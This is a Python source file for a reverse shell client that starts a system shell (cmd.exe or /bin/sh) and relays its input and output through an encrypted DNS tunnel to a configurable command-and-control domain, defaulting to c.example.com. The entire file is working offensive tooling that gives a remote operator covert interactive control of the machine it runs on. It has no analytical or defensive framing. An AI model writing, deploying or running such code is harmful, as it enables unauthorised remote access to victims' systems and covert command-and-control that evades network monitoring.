# shell.py
import sys
import os
import subprocess
import platform

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))
from lib.transport.stream import dns_stream

# Configuration - these should be set via command line or environment variables
TARGET_DOMAIN = os.getenv('TARGET_DOMAIN', 'c.example.com')
ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY', '')


def main():
    """Main function to run the reverse shell client."""
    
    # Check if configuration is provided
    if not TARGET_DOMAIN or not ENCRYPTION_KEY:
        print("Error: TARGET_DOMAIN and ENCRYPTION_KEY must be set")
        print("Usage: TARGET_DOMAIN=c.example.com ENCRYPTION_KEY=<hex_key> python shell.py")
        sys.exit(1)
    
    # Determine which shell to use based on operating system
    if platform.system() == "Windows":
        shell_cmd = ["cmd.exe"]
    else:
        shell_cmd = ["/bin/sh", "-c", "/bin/sh"]
    
    # Create DNS transport stream
    dns_transport = dns_stream(TARGET_DOMAIN, ENCRYPTION_KEY)
    
    # Spawn the shell process with DNS transport as stdin/stdout/stderr
    try:
        cmd = subprocess.Popen(
            shell_cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            bufsize=0  # Unbuffered
        )
        
        # Bridge shell I/O to DNS transport
        import threading
        
        def pipe_stdin():
            """Read from DNS and write to shell stdin."""
            try:
                while True:
                    data = dns_transport.read()
                    if data:
                        cmd.stdin.write(data)
                        cmd.stdin.flush()
            except Exception as e:
                print(f"stdin error: {e}")
        
        def pipe_stdout():
            """Read from shell stdout and write to DNS."""
            try:
                while True:
                    data = cmd.stdout.read(1024)
                    if data:
                        dns_transport.write(data)
            except Exception as e:
                print(f"stdout error: {e}")
        
        def pipe_stderr():
            """Read from shell stderr and write to DNS."""
            try:
                while True:
                    data = cmd.stderr.read(1024)
                    if data:
                        dns_transport.write(data)
            except Exception as e:
                print(f"stderr error: {e}")
        
        # Start I/O bridge threads
        threading.Thread(target=pipe_stdin, daemon=True).start()
        threading.Thread(target=pipe_stdout, daemon=True).start()
        threading.Thread(target=pipe_stderr, daemon=True).start()
        
        # Wait for shell to exit
        cmd.wait()
        
    except KeyboardInterrupt:
        print("\nShutting down...")
        sys.exit(0)
    except Exception as e:
        print(f"Error running shell: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
